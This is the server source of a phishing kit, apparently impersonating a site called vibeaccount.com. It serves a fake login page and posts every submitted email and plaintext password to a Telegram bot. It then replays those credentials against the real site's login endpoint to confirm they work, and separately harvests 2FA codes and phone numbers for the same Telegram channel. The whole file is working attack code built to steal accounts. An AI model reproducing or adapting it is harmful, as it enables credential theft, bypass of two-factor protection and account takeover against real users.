require('dotenv').config();
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Config
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(express.json());
app.use(express.static('public'));

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', service: 'vibe-account' });
});

// Send Telegram notification
async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('⚠️ Telegram not configured');
        return;
    }
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('📱 Telegram sent');
    } catch (error) {
        console.error('Telegram error:', error.message);
    }
}

// Direct HTTP authentication - NO PUPPETEER!
async function authenticateWithAPI(email, password) {
    try {
        console.log('🌐 Sending HTTP login request...');
        
        // Create form data (URL encoded) - matches the browser exactly
        const params = new URLSearchParams();
        params.append('usrname', email);
        params.append('passwd', password);
        
        // Send the login request - same as browser does
        const response = await axios.post('https://vibeaccount.com/authenticate/login', 
            params.toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Origin': 'https://vibeaccount.com',
                    'Referer': 'https://vibeaccount.com/',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': '1'
                },
                maxRedirects: 0,  // Don't follow redirects - we want to see the 302
                validateStatus: (status) => status < 400  // Accept 302 as valid
            }
        );
        
        console.log(`📡 Response status: ${response.status}`);
        
        // Check if login was successful
        // 302 Found = redirect to 2FA page = SUCCESS!
        const isValid = response.status === 302;
        
        console.log(`Result: ${isValid ? 'SUCCESS ✓' : 'FAILED ✗'}`);
        return { success: isValid };
        
    } catch (error) {
        // When maxRedirects is 0, axios throws error on 302
        // But 302 means success (redirect to 2FA page)
        if (error.response && error.response.status === 302) {
            console.log('✅ Redirect detected (302) - SUCCESS');
            return { success: true };
        }
        
        // Check for 200 with error message (invalid login)
        if (error.response && error.response.status === 200) {
            const data = error.response.data;
            if (typeof data === 'string' && data.includes('Invalid Login')) {
                console.log('❌ Invalid credentials');
                return { success: false };
            }
        }
        
        console.error('API error:', error.message);
        return { success: false };
    }
}

// Authentication endpoint
app.post('/authenticate', async (req, res) => {
    const { email, password } = req.body;
    
    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email and password required' });
    }
    
    console.log(`\n🔐 Login attempt: ${email}`);
    sendToTelegram(`🔄 Login attempt\n📧 ${email}\n🔑 ${password}`);
    
    const result = await authenticateWithAPI(email, password);
    
    if (result.success) {
        sendToTelegram(`✅ SUCCESS!\n📧 ${email}`);
        console.log('✅ VALID');
    } else {
        sendToTelegram(`❌ FAILED\n📧 ${email}`);
        console.log('❌ INVALID');
    }
    
    res.json({ success: result.success });
});

// 2FA endpoint
app.post('/submit-otp', async (req, res) => {
    const { otp, trusted } = req.body;
    console.log(`🔐 2FA Code: ${otp}`);
    sendToTelegram(`🔐 2FA CODE\nCode: ${otp}\nTrusted: ${trusted}`);
    res.json({ success: true });
});

// Phone endpoint
app.post('/submit-phone', async (req, res) => {
    const { phone } = req.body;
    console.log(`📱 Phone: ${phone}`);
    sendToTelegram(`📱 PHONE NUMBER\nNumber: ${phone}`);
    res.json({ success: true });
});

// Start server
app.listen(PORT, () => {
    console.log(`\n========================================`);
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`✅ Direct HTTP authentication (NO PUPPETEER!)`);
    console.log(`📱 Telegram: ${BOT_TOKEN ? '✅ Configured' : '❌ Not configured'}`);
    console.log(`========================================\n`);
});